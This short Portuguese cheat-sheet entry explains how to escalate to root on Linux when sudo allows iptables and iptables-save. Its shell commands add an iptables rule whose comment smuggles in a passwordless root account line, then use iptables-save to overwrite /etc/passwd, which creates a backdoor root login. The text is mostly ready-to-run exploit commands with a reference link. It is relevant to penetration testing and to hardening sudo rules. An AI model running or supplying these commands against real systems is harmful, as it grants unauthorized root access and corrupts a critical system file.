Se pudermos executar os binários `iptables` e `iptables-save` com `sudo` podemos criar uma regra com um comentário malicioso e salva-lo no `/etc/passwd`.

```sh
$ sudo -l
user ALL=(ALL) NOPASSWD: /usr/bin/iptables
user ALL=(ALL) NOPASSWD: /usr/bin/iptables-save
```

Aqui criamos a regra maliciosa
```sh
sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nroot4me::0:0:root:/root:/bin/bash\n'
```

Aqui salvamos ela no arquivo `/etc/passwd`, faça o backup antes.
```sh
sudo iptables-save -f /etc/passwd
```

***
#### Referência
https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/